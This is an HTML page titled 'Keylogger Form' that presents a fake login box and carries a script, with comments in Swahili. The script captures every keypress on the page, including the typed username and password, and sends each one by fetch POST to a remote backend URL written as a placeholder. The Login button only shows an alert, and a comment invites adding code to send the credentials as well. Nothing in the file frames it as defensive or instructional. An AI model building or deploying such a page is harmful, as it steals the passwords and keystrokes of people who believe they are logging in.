<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Keylogger Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 40px;
      background: #f5f5f5;
    }
    input, button {
      padding: 10px;
      margin: 5px 0;
      width: 100%;
      max-width: 300px;
      font-size: 16px;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login Form</h2>
    <input type="text" placeholder="Username" id="username">
    <input type="password" placeholder="Password" id="password">
    <button onclick="submitForm()">Login</button>
  </div>

  <script>
    const backendURL = "https://your-node-backend.onrender.com/send"; // badilisha hii

    function sendKey(key) {
      fetch(backendURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ key })
      }).catch(err => console.error("Send error:", err));
    }

    document.addEventListener("keydown", function(e) {
      sendKey(e.key);
    });

    function submitForm() {
      alert("Logging in...");
      // Unaweza ongeza fetch ya credentials hapa ukitaka
    }
  </script>
</body>
</html>
